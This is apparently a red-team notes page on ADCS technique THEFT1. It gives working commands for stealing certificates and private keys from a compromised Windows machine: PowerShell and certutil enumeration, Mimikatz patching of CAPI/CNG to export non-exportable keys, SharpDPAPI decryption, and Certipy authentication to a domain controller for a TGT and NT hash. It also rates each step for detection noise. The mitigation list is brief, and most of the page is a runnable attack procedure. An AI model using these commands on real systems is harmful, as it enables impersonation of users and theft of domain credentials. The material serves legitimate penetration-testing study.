---
title: "THEFT1 — Exporting Certificates and Keys"
description: "THEFT1 is the simplest credential-theft primitive in the ADCS taxonomy: harvest certificates that are already enrolled on a machine you control, rather…"
category: active-directory
tags: ["active-directory", "adcs"]
tools: ["Mimikatz", "Certipy", "faketime", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/THEFT1 — Exporting Certificates and Keys.md"
---
# THEFT1 — Exporting Certificates and Keys

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Credential Theft (local) |
| **Difficulty** | Low |
| **Pre-requisites** | Code execution as the cert's owner (or SYSTEM); a certificate with a usable private key in a Windows store |
| **Tools** | Certipy, Mimikatz, SharpDPAPI, certutil |
| **OPSEC Noise** | Low–Med — local API calls; Mimikatz key-patching touches LSASS/CryptoAPI |
| **One-liner** | Pull a certificate **and its private key** out of a compromised host's certificate store, exporting to a `.pfx` you can authenticate with anywhere. |

***

## What Is THEFT1?

THEFT1 is the simplest credential-theft primitive in the ADCS taxonomy: harvest certificates that are **already enrolled** on a machine you control, rather than requesting new ones. If a user or machine has an authentication certificate in their Windows store, that `.pfx` is a password-equivalent — export it and authenticate as them from your own box.

The only wrinkle is the **exportable** flag. When a key is marked non-exportable, the standard export APIs refuse. Mimikatz can patch the CryptoAPI (CAPI) and CNG providers in memory to lie about that flag, making non-exportable keys exportable.

***

## Step 0 — Enumerate Local Certificates

```powershell
# PowerShell — list certs in the current user's personal store with private keys
Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.HasPrivateKey } |
  Format-List Subject, Issuer, Thumbprint, NotAfter, @{n='EKU';e={$_.EnhancedKeyUsageList}}

# Machine store (needs admin)
Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.HasPrivateKey }

# certutil equivalent
certutil -store My
certutil -user -store My
```

Look for certs with **Client Authentication (1.3.6.1.5.5.7.3.2)**, **Smart Card Logon**, **PKINIT**, or **Any Purpose** EKUs — those authenticate to AD.

***

## Step 1 — Export (Exportable Keys)

```powershell
# PowerShell — export to PFX with a password
$pw = ConvertTo-SecureString "Export123!" -AsPlainText -Force
Export-PfxCertificate -Cert Cert:\CurrentUser\My\<THUMBPRINT> -FilePath C:\Temp\stolen.pfx -Password $pw
```

```powershell
# Mimikatz — export every cert + key from both stores (writes .pfx files to cwd)
mimikatz # crypto::certificates /export
mimikatz # crypto::certificates /systemstore:local_machine /export
```

***

## Step 2 — Export (Non-Exportable Keys)

If the key is flagged non-exportable, patch the providers first, then export.

```powershell
mimikatz # privilege::debug
mimikatz # crypto::capi                 # patch CAPI in this process
mimikatz # crypto::cng                  # patch KeyIso (CNG) — needs SYSTEM
mimikatz # crypto::certificates /export # now succeeds on non-exportable keys
```

```powershell
# SharpDPAPI alternative — pulls certs and decrypts keys via DPAPI, ignores the flag
SharpDPAPI.exe certificates /mkfile:masterkeys.txt
```

***

## Step 3 — Convert & Authenticate

```bash
# Bring the .pfx to your attack host. Strip/normalise the password if needed:
certipy-ad cert -export -pfx stolen.pfx -password 'Export123!' -out clean.pfx

# Authenticate the stolen identity (PKINIT -> TGT + NT hash)
certipy-ad auth -pfx clean.pfx -dc-ip $TARGET
```

> [!tip] Clock skew
> If `certipy auth` returns `KRB_AP_ERR_SKEW`, wrap it with faketime. See faketime-cheatsheet.

***

## OPSEC Considerations

| Action | Log / Artefact | Noise |
| :-- | :-- | :-- |
| `Get-ChildItem Cert:` / certutil enum | none by default | 🟢 Low |
| `Export-PfxCertificate` | CAPI2 operational log 70/90 (if enabled) | 🟢 Low |
| Mimikatz `crypto::cng` | LSASS access, patches KeyIso | 🔴 High (EDR-sensitive) |

***

## Mitigation

- Mark private keys **non-exportable** and back them with a **TPM** or **HSM** where possible.
- Restrict local admin / block LSASS access (Credential Guard, ASR rules) to stop provider patching.
- Prefer short-lived certificates so a stolen `.pfx` has a small window.
- Monitor for Mimikatz `crypto::*` behaviour and unexpected `.pfx` creation.

***

## See Also

- _ADCS Attack Methodology Guide · THEFT2 — User Certificate Theft via DPAPI · THEFT5 — NTLM Theft via PKINIT (UnPAC-the-Hash)
- Sources: SpecterOps *Certified Pre-Owned*; [Certipy Wiki — Post-Exploitation](https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation)
